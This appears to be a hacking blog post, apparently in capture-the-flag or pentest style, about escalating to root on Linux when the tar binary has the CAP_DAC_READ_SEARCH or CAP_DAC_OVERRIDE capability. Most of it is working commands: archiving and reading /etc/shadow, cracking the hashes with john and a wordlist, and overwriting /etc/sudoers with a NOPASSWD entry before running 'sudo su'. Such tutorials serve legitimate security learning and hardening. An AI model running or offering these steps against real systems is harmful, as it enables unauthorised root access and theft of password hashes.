---
layout: post
title: Abusing /tar capabilities to escalate privileges
date: 2023-05-13 00:12 +0000
comments: active
#image: /assets/img/Mr10.jpg
categories: [Privilege Escalation]
tags: [Privilege Escalation]
---

If ***/tar*** has the ***CAP_DAC_READ_SEARCH*** or ***CAP_DAC_OVERRIDE*** Linux capability set to the binary, it can be abused to escalate privileges to root. 

[Hack Tricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities){:target="_blank"}{:rel="noopener noreferrer"} does a good job at explaining how Linux capabilities works. Simply put, Linux capabilities provide a subset of the available root privileges to a process or binary. This is meant to reduce the attack surface of a system, but if it is not configured correctly it can lead to privilege escalation. 

## What is /tar?
/tar is a Linux binary installed by default on the majority of Nix based operating systems. It stands for '**Tape Archive'** and is used to create, extract and compress archives. You may be familiar with the file formats:

> `foo.tar` - Uncompressed data. Bundles together multiple files into an 'archive' or a 'tarball'. Can also be used to archive a single file.
{: .prompt-info }
> `foo.gz` - Compressed data. Can be used to compress a .tar file.
{: .prompt-info }
> `foo.tar.gz` - A compressed archive file.
{: .prompt-info }

To check if /tar is installed, you can run the following command:
```bash
which tar
```
>`/usr/bin/tar`

## Determining if /tar is vulnerable 
To check what capabilities are set to /tar, you can run the following command:
```bash
getcap /usr/bin/tar
```
If it is vulnerable, you will see one of the following:
>`/usr/bin/tar = cap_dac_read_search+ep`

>`/usr/bin/tar = cap_dac_override+ep`

## Privilege escalation process  
### CAP_DAC_READ_SEARCH Method
***CAP_DAC_READ_SEARCH*** allows binaries to bypass file read, and directory read and execute permissions. This means /tar can be used to access sensitive areas of an operating system as a normal user, such as the /etc/shadow file or the /root directory. To create an archive of the /etc/shadow file, you can run the following command:
```bash
tar -czf /tmp/shadow.tar.gz /etc/shadow
```

The /tar flags are important to understand:
> `-c` : Creates archive 

> `-z` : Compresses an archive with gzip

> `-f` : Designated file name

The file can then be decompressed and printed out to view the hashed passwords:
```bash
gzip -d /tmp/shadow.tar.gz 
cat /tmp/shadow.tar
```
```
root:$6$HbEKQFPH$5qqq6gXYJpsQpk0ZNGD1R/WClLPawMYLuL9Kn.PQE5W4grdRtoopgvgRJZs36A0a7Nwvi4L53B0yiSA.3Hq7k/:19171:0:99999:7::: 
bin:*:18353:0:99999:7:::
apache:!!:19171::::::
```
{: file="shadow.tar" }
Shadow hashes can be cracked with john, using the following command:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
If the password is not too strong, the password may be cracked out:
![John cracking the Hash](/assets/img/screenshots/john_hash_cracked.png)
_The hashed password was cracked out to 'root'_

If the password is too strong, it may not be able to be cracked out with John. Enumerating the target machine for other sensitive areas which may contain files of interest could still assist with escalating privileges. This could include archiving the /root directory to search for things such as SSH keys, or archiving other applications which may store configuration files and passwords.

### CAP_DAC_OVERRIDE Method
***CAP_DAC_OVERRIDE*** gives the same rights to a binary as ***CAP_DAC_READ_SEARCH***, except it also means you can bypass write permission checks on any file, so you can write to any file. If the /tar binary has this capability set, all you need to do is use /tar to overwrite the /etc/sudoers file.

Begin by creating a file called 'sudoers' that gives sudo rights to your low privilege user:
```bash
echo "mr10 ALL=(ALL) NOPASSWD:ALL" > sudoers
```
Archive and compress the file:
```bash
tar -czf sudoers.tar.gz sudoers
```
Decompress the file:
```bash
gzip -d sudoers.tar.gz
```
Extract the archive file into the /etc directory:
```bash
tar -xf sudoers.tar --directory /etc/
```
Elevate your privileges to root:
```bash
sudo su
```
The same method can be used to update the /etc/passwd file or the /etc/shadow file, allowing you to update root passwords or other administrator accounts.

<br>

Happy Hacking,

Mr10 💎